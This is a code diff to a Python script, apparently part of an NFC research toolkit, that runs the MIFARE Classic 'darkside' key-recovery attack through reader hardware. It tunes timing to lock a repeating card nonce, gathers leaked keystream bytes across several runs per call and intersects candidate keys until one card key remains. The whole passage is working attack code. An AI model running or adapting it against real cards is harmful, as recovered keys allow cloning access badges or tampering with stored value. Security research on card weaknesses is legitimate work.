@@ -5,8 +5,8 @@ the on-chip loop steers onto a repeating tag nonce and collects the 8 NACK keyst
 
     darkside_hw.py HOST [block] [keyB]
 
-Each OP_DARKSIDE call is one run (one locked nt + its ks[8], or a partial failure). The host runs
-several, intersects the candidate key lists (darkside.nonce2key), and reports / checks the survivor.
+Each OP_DARKSIDE call collects SLOTS runs at once (per slot one locked nt + its ks[8], or a partial
+failure). The host intersects the candidate key lists (darkside.nonce2key) and reports the survivor.
 """
 import sys
 import time
@@ -16,6 +16,7 @@ from mfc import pack
 from rawa import with_crc
 import darkside
 
+SLOTS = 3                           # runs per call (nfcprobe mfc.c DS_SLOTS)
 NR_WIRE = 0xAABBCC00 & 0xFFFFFF1F   # fixed on-wire reader nonce (last 3 bits = nt_diff)
 AR_WIRE = 0x11223344                # fixed on-wire reader response
 
@@ -60,10 +61,10 @@ def main():
     PROBE = 6000
     tps = None
     for _ in range(8):
-        nt0, nt1, _, _, _ = s.mon.darkside(steps, acode, aframe, nrar, PROBE, maxiter=2)
+        (nt0, *_), (nt1, *_) = s.mon.darkside(steps, acode, aframe, nrar, PROBE, maxiter=2, nslot=2)
         d = darkside.dist_nt(nt0, nt1)
         if d:
-            tps = PROBE / abs(d)
+            tps, probe = PROBE / abs(d), abs(d)
             print(f"  calib: d {d} over {PROBE} ticks -> {tps:.3f} ticks/step")
             break
     if not tps:
@@ -73,8 +74,9 @@ def main():
     # Refine the grid spacing to one PRNG period (65535 steps; the advance at a fixed spacing is
     # deterministic, so this is a closed loop) until it is well inside the op's steering window.
     sync = round(65535 * tps)
+    a = 0
     for _ in range(16):
-        nt0, nt1, _, _, _ = s.mon.darkside(steps, acode, aframe, nrar, sync, maxiter=2)
+        (nt0, *_), (nt1, *_) = s.mon.darkside(steps, acode, aframe, nrar, sync, maxiter=2, nslot=2)
         a = darkside.dist_nt(nt0, nt1)
         print(f"  refine: sync {sync} advance {a}")
         if a is None:
@@ -83,23 +85,34 @@ def main():
             break
         sync -= round(a * tps)
 
+    # The card's clock stops in the reader's pauses, so each AUTH costs `pause` PRNG steps on top of
+    # the time between AUTHs: PROBE ticks = probe steps, sync ticks = 65535 + a. Real ticks per step,
+    # and the grid for SLOTS slots per period.
+    tps = (sync - PROBE) / (65535 + (a or 0) - probe)
+    pause = PROBE / tps - probe
+    grid = tps * (65535 / SLOTS + pause)
+    print(f"  {tps:.4f} ticks/step, {pause:.0f} steps per AUTH, grid {grid:.1f}")
     tq = round(tps * 256)
     common = None
     runs = 0
     t0 = time.time()
-    for attempt in range(12):
-        nt, _, ks, mask, hits = s.mon.darkside(steps, acode, aframe, nrar, sync, tq=tq)
-        if mask != 0xFF:
-            print(f"  run: nt {nt:08X} mask {mask:02X} hits {hits}")
-            continue
-        runs += 1
-        ks_info = sum(ks[c] << ((7 - c) * 8) for c in range(8))
-        cand = set(darkside.nonce2key(uidi, nt, NR_WIRE, AR_WIRE, 0, ks_info))
-        # the common-prefix recovery misses the key ~1 run in 10: then go on from this run alone
-        common = cand if not common or not (common & cand) else (common & cand)
-        print(f"  run {runs}: nt {nt:08X}, {len(cand)} cands, intersection {len(common)}  "
-              f"({time.time() - t0:.1f}s)")
-        if len(common) <= 1:
+    for attempt in range(4):
+        slots = s.mon.darkside(steps, acode, aframe, nrar, int(grid), tq=tq, maxiter=40 * SLOTS, nslot=SLOTS,
+                               sfr=round((grid - int(grid)) * 256))
+        for nt, ks, mask, hits in slots:
+            if mask != 0xFF:
+                print(f"  run: nt {nt:08X} mask {mask:02X} hits {hits}")
+                continue
+            runs += 1
+            ks_info = sum(ks[c] << ((7 - c) * 8) for c in range(8))
+            cand = set(darkside.nonce2key(uidi, nt, NR_WIRE, AR_WIRE, 0, ks_info))
+            # the common-prefix recovery misses the key ~1 run in 10: then go on from this run alone
+            common = cand if not common or not (common & cand) else (common & cand)
+            print(f"  run {runs}: nt {nt:08X}, {len(cand)} cands, intersection {len(common)}  "
+                  f"({time.time() - t0:.1f}s)")
+            if len(common) <= 1:
+                break
+        if common and len(common) <= 1:
             break
 
     if common:
